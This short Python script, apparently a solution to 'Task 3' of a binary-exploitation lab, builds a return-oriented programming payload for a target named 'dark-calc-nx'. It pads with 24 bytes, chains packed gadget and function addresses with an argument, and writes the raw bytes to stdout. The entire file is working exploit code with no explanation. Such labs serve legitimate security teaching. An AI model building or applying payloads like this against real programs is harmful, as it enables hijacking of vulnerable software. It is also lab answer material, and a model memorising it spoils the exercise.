#!/usr/bin/env python3
"""Task 3: build the ROP payload for attack/dark-calc-nx."""
import struct
import sys

p64 = lambda x: struct.pack("<Q", x)

payload = b"A" * 24
payload += p64(0x401A33)
payload += p64(4)
payload += p64(0x401A34)
payload += p64(0x401978)

sys.stdout.buffer.write(payload)
